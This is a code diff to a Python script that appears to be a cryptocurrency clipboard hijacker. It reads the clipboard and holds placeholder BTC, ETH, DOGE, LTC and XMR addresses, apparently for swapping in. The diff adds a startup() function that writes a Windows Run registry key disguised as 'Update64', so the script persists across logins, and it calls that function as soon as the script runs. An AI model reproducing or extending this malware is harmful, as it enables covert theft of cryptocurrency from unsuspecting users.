@@ -1,11 +1,24 @@
 import pyperclip
 import re
+import winreg
+import os
 
 BTC_address = "btc address here"
 ETH_address = "eth address here"
 DOGE_address = "doge address here"
 LTC_address = "ltc address here"
 XMR_address = "xmr address here"
+
+def startup():
+    get_file_name = os.path.basename(__file__)
+    registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+    winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
+    winreg.SetValueEx(registry_key, 'Update64', 0, winreg.REG_SZ, f'{os.getcwd()}\\{get_file_name}')
+    winreg.CloseKey(registry_key)
+    
+startup()
 
 def match():
     clipboard = str(pyperclip.paste())
